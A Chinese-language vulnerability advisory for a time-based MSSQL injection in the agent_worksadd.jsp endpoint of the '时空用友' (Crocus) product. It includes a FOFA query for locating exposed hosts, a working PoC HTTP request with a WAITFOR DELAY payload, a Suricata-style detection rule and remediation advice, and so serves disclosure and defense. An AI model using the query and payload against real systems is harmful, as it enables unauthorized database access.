# 时空用友-agent_worksadd-Sql注入

时空用友-agent_worksadd-Sql注入，攻击者可进行sql注入攻击获取数据库信息或者权限。

# 影响版本

时空用友

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

# 漏洞复现

FOFA：product="Crocus" || (body="/ThirdResource/respond/respond.min.js" && title="Crocus")

POC/EXP：

```
GET /worksheet/agent_worksadd.jsp?id=1%27;WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1
Host: 127.0.0.1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
```

![image-20260122164356175](assets/image-20260122164356175.png)

sonrt规则：

```
alert http any any -> $HOME_NET any (
    msg:"时空用友 - MSSQL Time-Based SQL Injection via agent_worksadd.jsp";
    flow:to_server,established;
    http.method; content:"GET";
    http.uri; content:"/worksheet/agent_worksadd.jsp";
    http.uri; pcre:"/id=[^&]*'%3BWAITFOR%20DELAY%20'0%3A0%3A5'--/i";
    metadata:
        service http,
        affected_product "时空用友",
        vulnerability_type "MSSQL Time-Based SQL Injection",
        attack_target "database_server",
        severity "high";
    classtype:sql-injection;
    sid:1000591;
    rev:1;
    priority:1;
)
```

# 漏洞修复

关闭互联网暴露面或接口设置访问权限，升级至安全版本。
